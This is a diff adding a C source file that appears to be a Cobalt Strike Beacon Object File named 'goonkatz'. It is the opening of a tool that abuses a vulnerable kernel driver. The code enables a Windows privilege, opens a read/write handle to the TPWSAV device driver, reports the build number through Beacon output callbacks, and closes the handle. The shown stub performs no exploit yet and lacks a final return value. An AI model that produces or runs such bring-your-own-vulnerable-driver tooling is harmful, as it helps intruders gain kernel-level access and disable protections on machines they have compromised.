@@ -1,0 +1,40 @@
+#include "beacon.h"
+#include "defs.h"
+#include "ioctl.h"
+#include "goonkatz.h"
+
+
+#include "utils.c"
+#include "privileges.c"
+
+int go(char *args, int argLen)
+{
+    isServiceInstalled();
+
+    BOOL bResult = EnablePrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE);
+    if (!bResult) 
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Could not enable privilege : %llx", GetLastError());
+        return FALSE;
+    }
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Enabled SE_PROF_SINGLE_PROCESS_PRIVILEGE");
+
+    HANDLE hFile = CreateFileW(TPWSAV_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) 
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Could not open handle to driver : %llx", GetLastError());
+        return FALSE;
+    }
+    else 
+    {
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Got handle to device : %ls", TPWSAV_DEVICE_NAME);
+    }
+
+    char *build = GetWinBuildNumber();
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Windows Build Number: %s\n", build);
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Closing handle to vulnerable driver");
+    CloseHandle(hFile);
+    
+}
